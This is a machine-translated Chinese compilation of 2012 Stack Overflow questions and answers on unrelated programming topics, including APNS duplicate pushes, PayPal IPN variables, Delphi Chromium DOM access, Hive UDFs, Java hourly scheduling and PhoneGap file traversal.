# php - 重复的 Apple APNS 推送通知？

> ID：12866600
> 
> 赞同：29
> 
> 时间：2012-10-12T20:26:15.270
> 
> 标签：php, iphone, ios, push-notification, apple-push-notifications

一段时间以来，我们一直在我们的应用程序上使用 APNS 并没有发生太多事故，但突然间，我们的用户报告多次收到相同的推送通知。

我已经确认 - 乏味 - 我们的服务器只向 Apple 发送一次通知有效负载，但通知会在横幅和通知中心产生 2 个甚至 3 个相同的警报。

这已在 iOS5 和 iOS6 中观察到。

以前有人见过这种现象吗？我是否可能错过了向有效负载添加唯一标识符以防止 Apple 向设备发送重复通知的机会？Google 的 C2DM 对这类事情有 collapse_key，但我在 APNS 中找不到类似功能的参考。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-15T07:59:27.777

你能复制这个问题吗？如果它不是生产服务器，您应该尝试将标识符添加到通知中。还要检查用户是否在您的数据库中没有多次登录。例如。使用 twitter、Facebook 和密码等，都具有相同的设备令牌。

前段时间有一个类似的问题并深入挖掘我发现这些用户在他们的手机上除了最终版本之外还有多个版本的 beta iOS 固件，这导致苹果服务器多次向相同的设备 ID 发送相同的通知。

有些博客有针对消费者的说明，我们可以做的很少。

# xml - PyXB 和 python 框架

> ID：12866601
> 
> 赞同：6
> 
> 时间：2012-10-12T20:26:15.990
> 
> 标签：xml, django, binding, schema, pyramid

我使用[PyXB](http://pyxb.sourceforge.net/)从 java/spring 平台生成 Python 模块，该平台通过 RESTfull API 以 XSD 格式公开其类模式。

我现在能够使用那些 PyXB 绑定类/模块解析同一平台提供的 XML 数据。

我的问题是：

*   我如何在 Django 或 pyramid 等框架中利用这些类来构建动态模型表单、表格等，就像我使用来自 models.py django ORM 或通过[colander](http://docs.pylonsproject.org/projects/colander/en/latest/) / [deform](http://docs.pylonsproject.org/projects/deform/en/latest/) 或[pyramid-simpleform 的模型一样](http://packages.python.org/pyramid_simpleform/)？
*   有人在这些框架中使用过 PyXB 类吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T14:27:08.897

一种方法是创建从 PyXB 绑定到表单库的映射。例如，编写一些从 PyXB 类生成滤锅模式的代码应该不会太难。一旦你有了模式，你所需要的只是一种以相同格式序列化和反序列化对象的方法（这很简单：只有列表和字典中的值），你将能够从 PyXB 对象创建表单并保存它们背部。

这已经用 colander 和 sqlalchemy 完成了，ColanderAlchemy[的代码](https://github.com/stefanofontanelli/ColanderAlchemy)可能会给你一些关于如何做的灵感。

如果你把它放在 pypi 上，可以加分 :)

# paypal - 为暂停的订阅正确的贝宝 IPN 变量

> ID：12866602
> 
> 赞同：7
> 
> 时间：2012-10-12T20:26:17.040
> 
> 标签：paypal, paypal-ipn, paypal-subscriptions

如果按月付费的订阅者的信用卡过期，而贝宝在尝试获得资金时失败了 3 次，那么他们将被贝宝“暂停”。我正在尝试更新我的 PHP 脚本，以便在这种情况下在数据库中发生正确的更改。我研究了贝宝文档，但无法找到关于一旦用户帐户被暂停后我应该使用什么 IPN 变量的明确答案。

有谁知道以下哪个是要使用的正确变量和值？

if ($payment_status == "suspended" || $txn_type == "suspended" || $txn_type == "subscr_failed" || $profile_status == "suspended") {

谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-31T19:09:28.427

我得到了 $txn_type == "recurring_payment_suspended_due_to_max_failed_pa​​yment"，还请注意，您将使用 $recurring_payment_id 而不是 $subscr_id。至少当我在 Paypal 沙盒中模拟失败的付款时会发生这种情况。

# delphi - Chromium：如何获取加载页面的所有形式

> ID：12866605
> 
> 赞同：5
> 
> 时间：2012-10-12T20:26:46.240
> 
> 标签：delphi, chromium, tchromium

我尝试获取加载页面的所有形式的名称。我已经这样做了：

```
procedure TForm2.Button2Click(Sender: TObject);
var
  L: TStringList;
begin
  L := TStringList.Create;

  try
    Chromium1.Browser.MainFrame.VisitDomProc(
      procedure (const doc: ICefDomDocument)
        procedure IterateNodes(Node: ICefDomNode);
        begin
          if not Assigned(Node) then Exit;
          repeat
            if Node.ElementTagName = 'FORM' then
              L.Add(Node.GetElementAttribute('name'));

            if Node.HasChildren then IterateNodes(Node.FirstChild);

            Node := Node.NextSibling;
          until not Assigned(Node);
        end;
      begin
        IterateNodes(doc.Body);
      end
    );

    ShowMessage(L.Text);
  finally
    FreeAndNil(L);
  end;
end; 
```

但我没有任何结果。任何的想法？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-13T10:45:20.917

使用 XE2 更新 4

我已经意识到在运行过程参数时程序流程会继续，因此在到达 ShowMessage 时仍然没有运行此过程，因此 TStringList 是空的。

我已经放置了一个布尔变量控件并且它工作正常，但这不是一个优雅的解决方案。

这里是新代码：

```
procedure TForm2.Button2Click(Sender: TObject);
var
  L: TStringList;
  Finish: Boolean;
begin
  L := TStringList.Create;
  Finish := False;

  try
    Chromium1.Browser.MainFrame.VisitDomProc(
      procedure (const doc: ICefDomDocument)
        procedure IterateNodes(Node: ICefDomNode);
        begin
          if not Assigned(Node) then Exit;
          repeat
            if SameText(Node.ElementTagName, 'FORM') then
            begin
              L.Add(Node.GetElementAttribute('name'));
            end;

            if Node.HasChildren then
              IterateNodes(Node.FirstChild);

            Node := Node.NextSibling;
          until not Assigned(Node);
        end;
      begin
        IterateNodes(doc.Body);
        Finish := True;
      end
    );

    repeat Application.ProcessMessages until (Finish);
    ShowMessage(L.Text);
  finally
    FreeAndNil(L);
  end;
end; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-12-06T08:23:52.163

我设法得到这样的整个页面：

1.  注入一个 DOM 元素 - 文本。

```
ChromiumWB.Browser.MainFrame.ExecuteJavaScript('$("body").prepend(''<input type="text" id="msoftval" value=""/>'')', '', 0); 
```

2.  使用 jquery 或 js 将 body html 放入注入的元素中。

```
mResult := '';
ChromiumWB.Browser.MainFrame.ExecuteJavaScript('$("#msoftval").val($("body").html());', '', 0);
ChromiumWB.Browser.MainFrame.VisitDomProc(getResult);
while mResult = '' do Application.ProcessMessages;
Memo1.Text := mResult; 
```

3.  等到'VisitDomProc'完成-使其同步。

```
procedure TForm44.getResult(const doc: ICefDomDocument);
var
  q: ICefDomNode;
begin
  q := doc.GetElementById('msoftval');
  if Assigned(q) then
    mResult := q.GetValue
  else
    mResult := '-';
end; 
```

# assembly - 检测IP前的呼叫指令

> ID：12866607
> 
> 赞同：3
> 
> 时间：2012-10-12T20:26:53.683
> 
> 标签：assembly, x86

在 x86 上，调用后压入堆栈的地址指向调用指令之后的位置。该指令在 x86 机器上可以是可变长度的。有没有办法检测使用了哪种呼叫？

例如，间接调用 *(%eax) 是 FF 10，但这也可能是直接调用 0x10FF10FF 的一部分。IE

```
12: ff 10                   call   *(%eax)
14: e8 fb 10 ff 10          call   10ff1114 <main+0x10ff1114> 
```

例如，如果我找到 FF 10，那么在 E8 之前检查 3 个字节是否足够？还有哪些我没有想到的隐藏陷阱？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-12T20:59:30.823

由于您的信息比平时多一些，因此不太可能。但我会准确地展示即使有额外的信息它仍然是不可能的。

额外的信息来自于知道它跳转到哪里，并且知道返回地址。如果差异与返回地址之前的 dword 不匹配，则它不是直接调用。所以这是你可以相对容易地找到的东西，而不必弄乱反向解码（这通常是不可能的，只有靠运气和启发式方法以及不是专门设计来克服它的代码，即使这样，跳跃也可能来了从任何地方的任何地方进入）。

但是，代码可能是这样的：

```
 push returnaddr
  mov eax, calladdr
  jmp eax ;or whatever way you like, showing a silly jump through reg for no reason
  ...
  call calladdr
returnaddr: 
```

现在它无论如何都匹配，以一种你不可能检测到的方式。

所以你唯一能发现的是它是否绝对不是直接调用。您无法确定是否使用了任何特定方式 - 显然可以替换`call calladdr`上面代码段中的 以使其看起来像任何所需的模式。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-12T20:32:33.493

基本上，你不能。您也无法区分进行调用和将某个地址压入堆栈然后进行跳转之间的区别。您可以做出有根据的猜测，但除非您实际上在某种仿真器中运行了代码，从而生成了完整的指令跟踪（记录），否则某些恶意代码总是有可能欺骗您。

# hadoop - Hive UDF 执行

> ID：12866610
> 
> 赞同：2
> 
> 时间：2012-10-12T20:27:16.017
> 
> 标签：hadoop, hive

我编写了一个使用内部 API 进行解密的 Hive UDF，如下所示：

```
public Text evaluate(String customer) {
    String result = new String();

    if (customer == null) { return null; }

    try {
        result = com.voltage.data.access.Data.decrypt(customer.toString(), "name");
    } catch (Exception e) {
        return new Text(e.getMessage());
    }

    return new Text(result);
} 
```

**和 Data.decrypt 做：**

```
public static String decrypt(String data, String type) throws Exception {
    configure();
    String FORMAT = new String();
    if (type.equals("ccn")) {
        FORMAT = "CC";
    } else if (type.equals("ssn")) {
        FORMAT = "SSN";
    }   else if (type.equals("name")) {
        FORMAT = "AlphaNumeric";
    }

    return library.FPEAccess(identity, LibraryContext.getFPE_FORMAT_CUSTOM(),String.format("formatName=%s", FORMAT),authMethod, authInfo, data);
} 
```

其中**configure()**创建了一个非常昂贵的上下文对象。

我的问题是：Hive 是否为查询返回的每一行执行一次此 UDF？即如果我选择 10,000 行，评估方法会运行 10,000 次吗？

我的直觉告诉我**是**的。如果是这样，那么这是第二个问题：

有什么办法可以做到以下之一：

a) 在查询第一次开始时运行一次**configure()**，然后共享上下文对象

b）不是UDF返回解密的字符串，而是将加密的字符串聚合到某个集合中，然后我对集合进行批量解密？

提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T20:49:58.930

是否`configure()`需要每个 JVM 调用一次，或者每个 UDF 类的实例调用一次？

如果每个 JVM 一次，只需将其放在类中的静态块中，如下所示：

```
static {
    configure();
} 
```

如果每个实例一次，将其放入构造函数中：

```
public [class name]() {
    super();
    configure();
} 
```

# python - 如何在 Heroku 上升级分发包？

> ID：12866612
> 
> 赞同：1
> 
> 时间：2012-10-12T20:27:17.627
> 
> 标签：python, heroku, virtualenv, pip

我需要在 Heroku 上运行分发版本 0.6.28。我更新了我的 requirements.txt，但这似乎没有效果。

我正在尝试从需要此更高版本分发包的 tarball 中的模块进行安装。

在部署期间，我只得到这个：

```
 Running setup.py egg_info for package from http://downloads.sourceforge.net/project/mysql-python/mysql-python-test/1.2.4b4/MySQL-python-1.2.4b4.tar.gz
       The required version of distribute (>=0.6.28) is not available,
       and can't be installed while this script is running. Please
       install a more recent version first, using
       'easy_install -U distribute'.

       (Currently using distribute 0.6.27 (/tmp/build_ibj6h3in4vgp/.heroku/venv/lib/python2.7/site-packages/distribute-0.6.27-py2.7.egg))
       Complete output from command python setup.py egg_info:
       The required version of distribute (>=0.6.28) is not available, 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-03T00:34:58.040

好的，这是一个暂时可行的解决方案。我认为长期修复是 Heroku 升级他们的分发版本。

1.  fork python buildpack：[https ://github.com/heroku/heroku-buildpack-python/](https://github.com/heroku/heroku-buildpack-python/)
2.  将您需要的要求添加到包中（我将它们放在 bin/compile 中，就在其他 pip install 要求步骤之前）。有关该差异，请参见[https://github.com/buildingenergy/heroku-buildpack-python/commit/12635e22aa3a3651f9bedb3b326e2cb4fd1d2a4b](https://github.com/buildingenergy/heroku-buildpack-python/commit/12635e22aa3a3651f9bedb3b326e2cb4fd1d2a4b)。
3.  更改应用的 buildpack：

    heroku 配置：添加 BUILDPACK_URL=git://github.com/heroku/heroku-buildpack-python.git

4.  再推。它应该工作。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-10-12T22:43:52.913

尝试在第一次推送时将具有特定版本的分发添加到您的依赖项，然后添加所需的依赖项。

```
cat requirements.txt
...
distribute==0.6.28
...
git push heroku master
...
cat requirements.txt
...
your deps here 
```

# c# - @Html.RadioButtonFor 和编辑？

> ID：12866613
> 
> 赞同：1
> 
> 时间：2012-10-12T20:27:18.950
> 
> 标签：c#, .net, asp.net-mvc-3

现在`@Html.RadioButtonFor`总是让我感到困惑我在 ViewModel 中有一个枚举的属性（比如说 DayOfWeek，因为它是内置的）

```
public class VM
{
    public DayOfWeek  SelectedDayOfWeek { get; set; }
} 
```

在我看来我有

```
@Html.RadioButtonFor(x => x.Vm.SelectedDayOfWeek,false, new {@id = "Sun"})
@Html.RadioButtonFor(x => x.Vm.SelectedDayOfWeek,false, new {@id = "Mon"}) 
```

现在这有效，但我如何让它用于编辑。例如，他们想编辑他们设置的星期几。我想向他们展示他们选择的选项。

我怎么能这样。正如你现在看到的，它被硬编码为 false。

真的不想这样做

```
 @Html.RadioButtonFor(x => x.Vm.SelectedDayOfWeek,@SelectedSunValue, new {@id = "Sun"})
    @Html.RadioButtonFor(x => x.Vm.SelectedDayOfWeek,@SelectedMonValue, new {@id = "Mon"}) 
```

# java - 每小时运行一次 Java 代码

> ID：12866614
> 
> 赞同：3
> 
> 时间：2012-10-12T20:27:21.573
> 
> 标签：java, multithreading, jakarta-ee, scheduled-tasks

我正在尝试编写一个简单的 Java 程序，当分针为 20 时，它每小时运行一些代码。问题是我这样做的方式非常耗费 CPU。我熟悉石英，但我正在寻找一个更简单的解决方案，有什么想法吗？

```
 boolean run = true;
    while(run){
        Calendar calendar = new GregorianCalendar();
        int minute = calendar.get(Calendar.MINUTE);
        if(minute == 20){
            //Do some Stuff             
        }
    } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-12T20:38:24.393

一个简单的解决方案是使用 Executors 框架：

```
final ScheduledExecutorService s = Executors.newSingleThreadScheduledExecutor();
s.scheduleAtFixedRate(task, secondsToFirstOccurence, 60*60, TimeUnit.SECONDS); 
```

并使用一些逻辑来找出答案`secondsToFirstOccurence`。这可能会涉及一个`Calendar`实例，但使用 JodaTime 会更方便。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-12T20:31:21.513

请注意，如果您的应用程序在托管环境（Web 或 ejb 容器）中运行，则不允许您使用`Thread.sleep()`或任何其他与线程相关的操作，就此而言，请查看[EJB 限制](http://www.oracle.com/technetwork/java/restrictions-142267.html)页面。我对此提出警告是因为问题已标记为`java-ee`，因此“简单应用程序”毕竟可能不是那么简单 - 如果它在 Java EE 容器中运行，则需要注意其他事项。

如果您正在构建企业级应用程序，请忘记`Thread.sleep()`. 选择一个成熟的作业调度器，使用[Quartz](http://quartz-scheduler.org/)，它是一个开源且非常成熟和可靠的产品。或者使用[Obsidian Scheduler](http://obsidianscheduler.com/)，这是一个功能丰富的商业调度程序，具有比 Quartz 更多的开箱即用功能。

一个完整的调度程序（但适合在容器内运行）的轻量级替代方案是使用[Timer 服务](http://docs.oracle.com/javaee/5/tutorial/doc/bnboy.html)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-12T20:28:59.083

[`Thread.sleep()`](http://docs.oracle.com/javase/6/docs/api/java/lang/Thread.html#sleep%28long%29)您可能在通话之间寻找

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-12T20:34:24.403

查看[java.util.Timer](http://docs.oracle.com/javase/1.4.2/docs/api/java/util/Timer.html)方法 scheduleAtFixedRate()。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-10-17T10:57:03.347

我建议您从 java 程序中删除调度逻辑。
通过这样做，您可以只专注于您希望程序执行的操作，并将调度部分留给操作系统。
另外，例如，假设您决定在某个时候编写一个 c++ 程序来执行您的 java 代码所知道的操作，您不必在新程序中实现 cron 逻辑

话虽这么说：

*   对于 Linux，你有[crontab](http://kvz.io/blog/2007/07/29/schedule-tasks-on-linux-using-crontab/)
*   对于 Windows，您有[Windows 任务计划](http://support.microsoft.com/kb/308569)
*   对于 Mac，我不确定，但考虑到它是基于 UNIX 的 cron 应该存在。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-10-12T20:29:19.110

将您的代码无限期地使用并使用

```
Thread.sleep(3600000); 
```

20点后开始执行

**例子**

```
while(1==1) {
    //Your code here
    try{
         Thread.sleep(3600000);
    }
    catch (Exception e) {}
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-10-12T20:32:33.597

为您想要每小时执行的方法安排一个 cron 作业，而不是阻塞`sleep()`调用，使用一些调度框架，如[石英](http://quartz-scheduler.org/)

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-10-12T20:35:52.247

1）在第一次进入计算下一个到期时间。

2) 使用[java.util.Timer.schedule()](http://docs.oracle.com/javase/7/docs/api/java/util/Timer.html#schedule%28java.util.TimerTask,%20java.util.Date%29)

3) 重新安排每次运行。

**代码**

```
package tests;

import java.util.Calendar;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;

public class App201210130040 {

private static Timer timer = new Timer(false);

public static void schedule() {
    Calendar due = Calendar.getInstance();
    due.set(Calendar.MINUTE, 20);
    if( due.before(Calendar.getInstance()) ) {
        due.add(Calendar.HOUR, 1);
    }

    System.out.println("Scheduled to " + due.getTime().toString());

    timer.schedule(new TimerTask() {

        @Override
        public void run() {

            System.out.println("due");

            schedule();
        }

    }, due.getTime());

}

public static void main(String[] args) {
    schedule();
}

} 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2012-10-12T20:36:39.467

你应该看看 [ScheduledExecutorService](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/concurrent/ScheduledExecutorService.html)

```
class BeeperControl {
private final ScheduledExecutorService scheduler = 
   Executors.newScheduledThreadPool(1);

public void beepForAnHour() {
    final Runnable beeper = new Runnable() {
            public void run() { System.out.println("beep"); }
        };
    final ScheduledFuture<?> beeperHandle = 
        scheduler.scheduleAtFixedRate(beeper, 10, 10, SECONDS);
    scheduler.schedule(new Runnable() {
            public void run() { beeperHandle.cancel(true); }
        }, 60 * 60, SECONDS);
}
} 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2012-10-12T20:38:40.847

使用这样的东西

```
Calendar calendar = Calendar.getInstance();
calendar.set(Calendar.HOUR_OF_DAY, 20);
calendar.set(Calendar.MINUTE, 20);
calendar.set(Calendar.SECOND, 0);
Date time = calendar.getTime();
Timer timer = new Timer();
timer.schedule(new SomeTask(), time); 
```

然后重新安排

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2012-10-12T20:46:33.877

因此，正如许多其他答案所述， [ScheduledExecutorService绝对很棒。](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/concurrent/ScheduledExecutorService.html)

如果您使用的是 Java EE 6 服务器，您可以从中获得一些乐趣，`@Schedule`并且`ScheduleExpression`

请参阅[使用“crontab 语法”来安排 EJB 任务](https://stackoverflow.com/questions/7361889/have-an-ejb-schedule-tasks-with-crontab-syntax/7365953#7365953)

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2012-10-12T20:58:07.610

另一个例子

```
import java.text.SimpleDateFormat;
import java.util.Date;

public class TestHour {

    private static final int MINUNTE = 20;

    public static void main(String args[]) {
        while (true) {
            SimpleDateFormat bartDateFormat = new SimpleDateFormat("mm");
            Date date = new Date();
            int currentMin = new Integer(bartDateFormat.format(date))
                    .intValue();
            if (currentMin < MINUNTE) {
                sleepMinutes(MINUNTE - currentMin);
            } else if (currentMin > MINUNTE) {
                sleepMinutes(60 - currentMin + MINUNTE);
            } else {
                // DO SOMETHING EVERY HOUR
                System.out.println("come on do it!!!");
                sleepMinutes(60);
            }
        }
    }

    private static void sleepMinutes(int minutes) {
        try {
            System.out.println("Sleeping for " + minutes);
            Thread.sleep(minutes * 1000*60);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    } 
```

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2012-10-12T21:28:07.003

今天学到的东西又是另一个例子。

```
import java.util.Calendar;
import java.util.Date;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class SchedulerExample2 implements Runnable{

    public static void main(String args[]) {

        Calendar due = Calendar.getInstance();
        due.set(Calendar.MILLISECOND, 0);
        due.set(Calendar.SECOND, 0);
        due.set(Calendar.MINUTE, 20);
        if (due.before(Calendar.getInstance())) {
            due.add(Calendar.HOUR, 1);
        }
        long milliSecondsToNextOcurrence =  due.getTimeInMillis() - new Date().getTime();
        final ScheduledExecutorService s = Executors.newSingleThreadScheduledExecutor();
        ShedulerExample task = new  ShedulerExample();
        s.scheduleAtFixedRate(task, milliSecondsToNextOcurrence, 60*60*1000, TimeUnit.MILLISECONDS);
    }

    @Override
    public void run() {
            System.out.println("hola->"+new Date());
    }   
} 
```

# android - Mono for Android 的 Binding Crittercism

> ID：12866617
> 
> 赞同：2
> 
> 时间：2012-10-12T20:27:31.887
> 
> 标签：android, binding, xamarin.android, crittercism

我正在尝试使用 Crittercism for Mono for Android。我已经设法用以下 Metadata.xml 编译了 crittercism jar 的绑定项目

```
<metadata>
  <remove-node path="/api/package[@name='crittercism.android']/class[@name='a.a']" />  
  <remove-node path="/api/package[@name='crittercism.android']/class[@name='a.c']" />  
  <remove-node path="/api/package[@name='crittercism.android']/class[@name='b.b']" />  
  <remove-node path="/api/package[@name='crittercism.android']/class[@name='d.a']" />  
  <remove-node path="/api/package[@name='crittercism.android']/class[@name='f.a']" />  
</metadata> 
```

如果我在单声道开发中使用程序集浏览器检查生成的 dll，则 init 方法

```
Com.Crittercism.App.Crittercism.Init(Context c, String token); 
```

缺少它。我上面提到的类的删除在我看来只是内部混淆类，但我不确定。有没有人成功地使用它？

编辑：

在构建日志中，我可以找到一行

```
Unknown parameter type org.json.JSONObject... found in method Init in type Com.Crittercism.App.Crittercism 
```

也许与此有关？我尝试在绑定项目中添加一个 json.org jar 作为参考 jar，但到目前为止没有成功。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-07-25T05:24:01.660

[Crittercism](http://www.crittercism.com)的联合创始人在这里。如果您仍然遇到绑定问题，实际上我们刚刚发布了一个官方支持的 Xamarin 插件，它应该可以修复该错误。你可以在这里下载：

[http://components.xamarin.com/view/crittercism](http://components.xamarin.com/view/crittercism)

# android - 使用phonegap文件api遍历SD卡中的每个文件

> ID：12866619
> 
> 赞同：3
> 
> 时间：2012-10-12T20:27:44.867
> 
> 标签：android, cordova, phonegap-plugins, w3c, fileapi

我想使用phonegap的FILE API（实际上是w3c文件api）遍历SD卡中所有目录和子目录中的每个文件。我必须通过查看它们的性质对这些文件执行一组特定的操作。我不想搜索特定类型的文件，而是按顺序遍历每个文件。

有人可以帮我吗？只需一个具有遍历必要要求的基本循环框架就会有很大帮助。

先感谢您。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-02T12:05:12.123

我认为以下代码应该可以工作：

```
window.requestFileSystem(LocalFileSystem.PERSISTENT, 0, onRequestFileSystem, fail);

function onRequestFileSystem(fileSystem) {
    var directoryReader = fileSystem.root.createReader();
    directoryReader.readEntries(onReadEntries, fail);
}

function onReadEntries(entries) {
    var i;
    for (i = 0; i < entries.length; i++) {
       if (entries[i].isFile == true) {
         // ...
       }
       if (entries[i].isDirectory == true) {
         var directoryReader = entries[i].fullPath.createReader();
         directoryReader.readEntries(onReadEntries, fail);
       }
    }
} 
```

[http://www.c-sharpcorner.com/UploadFile/e83792/filesystem-directoryentry-objects-in-phonegap/](http://www.c-sharpcorner.com/UploadFile/e83792/filesystem-directoryentry-objects-in-phonegap/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-08-09T22:05:04.557

```
scan : function(url,fileType,callback)
        {
             var fileTypeCollection = [];
             var defer = $q.defer();

                url.forEach(function(element, index) 
                {
                //requestLocalFileSystemURL
                log(element);
                window.resolveLocalFileSystemURL(element,onRequestFileSystem, fail);

                log("Ends resolve");
                });

            function onRequestFileSystem(fileSystem) 
            {
                var directoryReader = fileSystem.createReader();
                directoryReader.readEntries(onReadEntries,fail);
            } /*onRequestFile Ends*/

            function onReadEntries(entries) 
            {

                if(entries.length==0)
                {
                     log("Entries Length....Resolving");
                     defer.resolve(fileTypeCollection);
                }
                else
                {   
                    entries.forEach( function(element, index) 
                    {

                        if (element.isDirectory === true) 
                        {
                        // Recursive -- call back into this subdirectory

                         onRequestFileSystem(element);
                        } 

                        if(element.isFile == true) 
                        {

                                fileType.forEach(function(type)
                                {
                                    if(element.name.indexOf(type) != -1)
                                    {
                                        fileTypeCollection.push(element);
                                    }
                                }); 
                        } /*is File ENds*/
                    });  /*Entries For Each Ends*/
                }   

            }  /*OnRead Ends*/

            function fail(resp)
            {
                log(resp);
                defer.reject();
            }  /*Fail Ends*/

        return defer.promise;

    }  //Scan Function Ends 
```

试试这个。如果您愿意，请删除承诺并使用回调。promises 有点坏了。如果您可以修复，则可以，否则在推送 FileType 后使用回调

# c# - 在单元测试中使用 xml 转换

> ID：12866620
> 
> 赞同：3
> 
> 时间：2012-10-12T20:28:00.653
> 
> 标签：c#, visual-studio-2010, unit-testing, slowcheetah, xslt

## 背景：

目前，我们有大约 10 个单元/集成测试项目，这些项目针对数据库进行测试。命中数据库的每个测试类都继承自一个名为的类，该类`IntegrationTest`位于一个名为`TestBase`. `TestBase`包含一个配置文件 (nhibernate_log4net.cfg.xml)，其中包含到数据库的连接字符串。

我们的开发团队大约有 7 或 8 人。如果两个团队成员同时运行单元测试，就会出现冲突，因为很多测试都在添加和删除许多测试中常见的数据。这将导致两个开发人员之间的测试错误地失败。

## 布局：

**TestBase.dll**
IntegrationTest.cs（包含**[DeploymentItem("nhibernate_log4net.cfg.xml"]** )
nhibernate_log4net.cfg.xml
nhibernate_log4net.cfg.Developer 1.xml（转换文件）
nhibernate_log4net.cfg.Developer 2.xml（转换文件）
。 ..

**UnitTest.dll**
参考 -> **TestBase.dll**
MyUnitTest.cs（从**TestBase.dll**中的 IntegrationTest 继承）

## 问题：

我的想法是对团队中每个开发人员`SlowCheetah`的 dll 中的配置文件使用 xml 转换，`TestBase`但转换后的文件不会复制到单元测试的**Out**目录。基本配置文件（未转换的）是复制到**Out**目录的文件。我有一种感觉，这是因为`[DeploymentItem("nhibernate_log4net.cfg.xml")`我必须首先使用该属性来获取配置文件。

**有没有办法在一个单独的 dll 中包含的 xml 配置文件上使用 xml 转换，而不是单元测试项目？**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-13T01:16:43.743

您可以通过从 msbuild 调用目标来手动运行转换，如下所述：http: [//sedodream.com/2010/04/26/ConfigTransformationsOutsideOfWebAppBuilds.aspx](http://sedodream.com/2010/04/26/ConfigTransformationsOutsideOfWebAppBuilds.aspx)

**更新**

我已经能够重现您的问题。这很微妙，但我认为它按预期工作。这是正在发生的事情：

*   正在应用配置转换。转换后的文件放置在*TestBase*输出目录中。
*   您在测试中指定了 *[DeploymentItem("nhibernate_log4net.cfg.xml")]* ，但这失败了，因为该文件与*UnitTest*项目无关。作为补偿，您将配置文件标记为*“Copy Local”=true*
*   “复制本地”确保将 TestBase 项目的内容复制到 UnitTest 项目，但它要么从源位置复制预转换的文件，要么在 XmlTransform 任务运行之前将文件移动到 bin 文件夹中。（我倾向于认为是前者）

解决这个问题的一些建议：

1.  将配置文件移动到*UnitTest*库并在那里应用转换，这将确保配置可以按预期随时可供测试运行器使用；或者

2.  在 TestSettings 文件（而不是 DeploymentItemAttribute）中配置部署选项以从*TestBase*文件夹复制生成的文件。(<解决方案目录>\TestBase\bin\Debug\cfg.xml); 或者

3.  更改您的项目，使它们都共享相同的输出目录。这将确保 DeploymentItem 属性将转换后的 TestBase 配置文件复制到 TestRun 文件夹。（顺便说一句，共享输出文件夹是加快构建速度的好方法，因为不需要一次又一次地复制依赖项和内容）

（另外，疯狂支持 @SayedIbrahimHashimi，他是 SlowCheetahXml 背后的主要贡献者之一——大粉丝，非常喜欢这个扩展）

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-01-16T18:50:51.273

[SlowCheetah - XML 转换免费](http://visualstudiogallery.msdn.microsoft.com/69023d00-a4f9-4a34-a6cd-7e854ba318b5)

此包使您能够根据构建配置转换您的 app.config 或任何其他 XML 文件。它还添加了额外的工具来帮助您创建 XML 转换。

# c++ - 是否可以解决 CUDA 内存碎片问题？

> ID：12866621
> 
> 赞同：5
> 
> 时间：2012-10-12T20:28:01.400
> 
> 标签：c++, linux, memory-management, cuda, memory-fragmentation

我正在尝试分配一些内存，但有时会出现“内存不足”错误。**cudaMemGetInfo**说我需要更多可用的内存。所以，内存碎片问题。有可能解决这个问题吗？是否可以将元素放在内存中而不是一个一个地放置在我可以放置在内存中的几个和平中？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-12T21:23:30.357

如果您因为内存碎片而“内存不足”，那么您使用内存的方式就会出现一些错误！您负责对该内存进行分段，考虑重新设计您的程序，例如使用内存池来避免过多的新/删除以避免内存碎片

# c++ - ifstream/ofstream 真的用于序列化吗？

> ID：12866626
> 
> 赞同：1
> 
> 时间：2012-10-12T20:28:49.420
> 
> 标签：c++, string, file-io, stl, stream

我正在使用 ifstream 和 ostream 来序列化我的数据，但我惊讶地发现 `<<' 运算符不能分隔两个相邻的字符串，并且分隔它们会非常复杂。

```
class Name
{
string first_name;
string last name;

friend std::ostream& operator<< (std::ostream& os, const Name& _name)
{
     os << _name.first_name << _name.last_name; 
     return os;
}

friend std::istream& operator>> (std::istream& is, Name& _name)
{
     is >> _name.first_name >> _name.last_name;

     return is;
} 
```

这不起作用，因为 << 和 >> 不写入空终止符，并且 ifstream 读取变量 (first_name) 中的整个字符串，这有点令人失望。如何分别存储这两个字符串，以便我也可以分别读取它们？我不明白`<<`在 ostream 中连接所有字符串的动机是什么，所以我们不能单独读回它们！？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T21:15:29.367

> 我不明白 << 连接 ostream 中所有字符串的动机是什么，所以我们不能单独读回它们！？

这假设单独编写它们的*唯一*原因是将它们作为单独的字符串读取。*考虑这样一种情况，有人有一对字符串，他们想在没有*分隔符的情况下写入流。或者一个字符串，后跟一个他们不想要分隔符的浮点数。

